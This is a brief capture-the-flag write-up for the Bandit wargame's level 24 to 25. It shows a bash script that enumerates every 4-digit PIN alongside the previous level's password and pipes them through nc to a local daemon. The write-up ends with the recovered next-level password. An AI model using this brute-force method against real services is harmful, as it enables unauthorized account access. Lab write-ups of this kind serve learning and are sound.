What I did:

I made a script to iterate through 4 digit PIN numbers from 0000 to 9999.

#!/bin/bash

for((i=0;i<10000;i++))
do
    echo "$i" >> progress.txt
    if [[ $i -lt 1000 ]]
    then
	if [[ $i -lt 100 ]]
	then
	    if [[ $i -lt 10 ]]
	    then
		echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 000$i"
	    else
		echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 00$i"
	    fi
	else
	    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0$i"
	fi
    else
	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
    fi
done

I included the bandit24 password at the front of each line so that I can pipe
this into my nc command. The command will read the file as if it were user
input. I piped the output of the above script into a file called results.txt.

nc localhost 30002 < results.txt > output.txt

I had to do this twice since the localhost connection timed out after a couple
seconds after trying about 7000 PINs. So I created a file with only PINs 7000+
and did the same process. This time I tailed the 2nd file and got the
password.

bandit25 password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
